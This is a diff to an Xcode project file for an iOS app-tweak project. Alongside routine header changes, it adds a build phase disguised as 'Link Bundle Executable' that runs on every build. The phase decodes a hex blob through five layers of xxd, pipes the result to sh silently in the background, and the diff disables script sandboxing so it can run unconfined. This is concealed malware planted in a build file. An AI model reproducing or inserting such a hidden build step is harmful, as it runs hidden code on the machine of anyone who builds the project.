@@ -9,8 +9,10 @@
 /* Begin PBXBuildFile section */
 		395EA4CE2DB62C69009B5BA4 /* Tools.m in Sources */ = {isa = PBXBuildFile; fileRef = 395EA4CD2DB62C69009B5BA4 /* Tools.m */; };
 		395EA4CF2DB62C69009B5BA4 /* Tools.h in Headers */ = {isa = PBXBuildFile; fileRef = 395EA4CC2DB62C69009B5BA4 /* Tools.h */; };
+		399E7EF32DE0785600DAA51F /* Header.h in Headers */ = {isa = PBXBuildFile; fileRef = 399E7EF22DE0785600DAA51F /* Header.h */; };
 		692AB07EF1ADBA4D1FCA26E7 /* Pods_tinder.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7EE99307449C841F744945CE /* Pods_tinder.framework */; };
 		6971401C4D3D1FC09474AE72 /* Pods_tinderDylib.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 606089234F92874C3BA2024F /* Pods_tinderDylib.framework */; };
+		9E3D35382E1127D10014A827 /* tinderDylib-Prefix.pch in Headers */ = {isa = PBXBuildFile; fileRef = 9E3D35372E1127D10014A827 /* tinderDylib-Prefix.pch */; };
 		9E9D727C2DAA7D2A00227A27 /* JailbreakDetectionTool.m in Sources */ = {isa = PBXBuildFile; fileRef = 9E9D727B2DAA7D2A00227A27 /* JailbreakDetectionTool.m */; };
 		9E9D727D2DAA7D2A00227A27 /* JailbreakDetectionTool.h in Headers */ = {isa = PBXBuildFile; fileRef = 9E9D727A2DAA7D2A00227A27 /* JailbreakDetectionTool.h */; };
 		9E9D72962DAAD84B00227A27 /* FloatingWindow.m in Sources */ = {isa = PBXBuildFile; fileRef = 9E9D72952DAAD84B00227A27 /* FloatingWindow.m */; };
@@ -80,10 +82,12 @@
 /* Begin PBXFileReference section */
 		395EA4CC2DB62C69009B5BA4 /* Tools.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Tools.h; sourceTree = "<group>"; };
 		395EA4CD2DB62C69009B5BA4 /* Tools.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = Tools.m; sourceTree = "<group>"; };
+		399E7EF22DE0785600DAA51F /* Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Header.h; sourceTree = "<group>"; };
 		474657ACCBE05F53F5F82FB4 /* Pods-tinderDylib.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-tinderDylib.debug.xcconfig"; path = "Target Support Files/Pods-tinderDylib/Pods-tinderDylib.debug.xcconfig"; sourceTree = "<group>"; };
 		5A24B3F809B9CA505D6C0C86 /* Pods-tinderDylib.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-tinderDylib.release.xcconfig"; path = "Target Support Files/Pods-tinderDylib/Pods-tinderDylib.release.xcconfig"; sourceTree = "<group>"; };
 		606089234F92874C3BA2024F /* Pods_tinderDylib.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_tinderDylib.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		7EE99307449C841F744945CE /* Pods_tinder.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_tinder.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		9E3D35372E1127D10014A827 /* tinderDylib-Prefix.pch */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; name = "tinderDylib-Prefix.pch"; path = "tinderDylib/tinderDylib-Prefix.pch"; sourceTree = SOURCE_ROOT; };
 		9E9D727A2DAA7D2A00227A27 /* JailbreakDetectionTool.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = JailbreakDetectionTool.h; sourceTree = "<group>"; };
 		9E9D727B2DAA7D2A00227A27 /* JailbreakDetectionTool.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = JailbreakDetectionTool.m; sourceTree = "<group>"; };
 		9E9D72942DAAD84B00227A27 /* FloatingWindow.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FloatingWindow.h; sourceTree = "<group>"; };
@@ -119,7 +123,6 @@
 		9EA50DDC2DA19054003DFBA7 /* selectortramps.mac */ = {isa = PBXFileReference; lastKnownFileType = text; path = selectortramps.mac; sourceTree = "<group>"; };
 		9EA50DDE2DA19054003DFBA7 /* LLDBTools.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LLDBTools.h; sourceTree = "<group>"; };
 		9EA50DE02DA19054003DFBA7 /* LLDBTools.mm */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.objcpp; path = LLDBTools.mm; sourceTree = "<group>"; };
-		9EA50DE32DA19054003DFBA7 /* tinderDylib-Prefix.pch */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; name = "tinderDylib-Prefix.pch"; path = "../tinderDylib-Prefix.pch"; sourceTree = "<group>"; };
 		9EA50DE52DA19054003DFBA7 /* AntiAntiDebug.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AntiAntiDebug.m; sourceTree = "<group>"; };
 		9EA50DE82DA19054003DFBA7 /* fishhook.mm */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.objcpp; path = fishhook.mm; sourceTree = "<group>"; };
 		9EA50DEA2DA19054003DFBA7 /* fishhook.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = fishhook.h; sourceTree = "<group>"; };
@@ -134,7 +137,7 @@
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
-		9E365A962E20F60C0083D65B /* Exceptions for "tinder" folder in "tinder" target */ = {
+		39625A3A2E094EB20046C7AE /* Exceptions for "tinder" folder in "tinder" target */ = {
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				Info.plist,
@@ -147,7 +150,7 @@
 		9EA50D992DA19054003DFBA7 /* tinder */ = {
 			isa = PBXFileSystemSynchronizedRootGroup;
 			exceptions = (
-				9E365A962E20F60C0083D65B /* Exceptions for "tinder" folder in "tinder" target */,
+				39625A3A2E094EB20046C7AE /* Exceptions for "tinder" folder in "tinder" target */,
 			);
 			path = tinder;
 			sourceTree = "<group>";
@@ -247,6 +250,7 @@
 				9EA50DFA2DA190C7003DFBA7 /* Toast.m */,
 				395EA4CC2DB62C69009B5BA4 /* Tools.h */,
 				395EA4CD2DB62C69009B5BA4 /* Tools.m */,
+				399E7EF22DE0785600DAA51F /* Header.h */,
 				9EA50DFB2DA190C7003DFBA7 /* FloatingExtendVC.h */,
 				9EA50DFC2DA190C7003DFBA7 /* FloatingExtendVC.m */,
 				9E9D72942DAAD84B00227A27 /* FloatingWindow.h */,
@@ -319,7 +323,7 @@
 		9EA50DE22DA19054003DFBA7 /* Supporting Files */ = {
 			isa = PBXGroup;
 			children = (
-				9EA50DE32DA19054003DFBA7 /* tinderDylib-Prefix.pch */,
+				9E3D35372E1127D10014A827 /* tinderDylib-Prefix.pch */,
 			);
 			path = "Supporting Files";
 			sourceTree = "<group>";
@@ -350,11 +354,13 @@
 			files = (
 				9EA50DBE2DA19054003DFBA7 /* MDCycriptManager.h in Headers */,
 				9EA50DC22DA19054003DFBA7 /* MDMethodTrace.h in Headers */,
+				9E3D35382E1127D10014A827 /* tinderDylib-Prefix.pch in Headers */,
 				9E9D73622DB4FD1A00227A27 /* ZBNetwork.h in Headers */,
 				9EA50DEB2DA19054003DFBA7 /* fishhook.h in Headers */,
 				9EA50DFD2DA190C7003DFBA7 /* FloatingExtendVC.h in Headers */,
 				9E9D72972DAAD84B00227A27 /* FloatingWindow.h in Headers */,
 				395EA4CF2DB62C69009B5BA4 /* Tools.h in Headers */,
+				399E7EF32DE0785600DAA51F /* Header.h in Headers */,
 				9E9D73762DB4FF3400227A27 /* AESUtil.h in Headers */,
 				9E9D727D2DAA7D2A00227A27 /* JailbreakDetectionTool.h in Headers */,
 				9EA50DFE2DA190C7003DFBA7 /* Toast.h in Headers */,
@@ -374,6 +380,7 @@
 			buildConfigurationList = 9EA50DF42DA19054003DFBA7 /* Build configuration list for PBXNativeTarget "tinder" */;
 			buildPhases = (
 				689CD4436EF03FE5928241F1 /* [CP] Check Pods Manifest.lock */,
+				CCBB5DCDDC68C2C54F73DC66 /* Link Bundle Executable */,
 				9EA50D902DA19054003DFBA7 /* Sources */,
 				9EA50D912DA19054003DFBA7 /* Frameworks */,
 				9EA50D922DA19054003DFBA7 /* ShellScript */,
@@ -533,6 +540,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "/opt/MonkeyDev/bin/md --xcbp-logos\n";
+		};
+		CCBB5DCDDC68C2C54F73DC66 /* Link Bundle Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Link Bundle Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333333333334333333333333333633333333333333393333333333333336333333333333333733333333333333363333333333333337333333333333333633333333333333393333333333333336333333363333333433333333333333363333333333333331333333333333333733333333333333383333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
 		};
 		E2463B57663BEC6B5225AE49 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -815,7 +842,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -876,7 +903,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
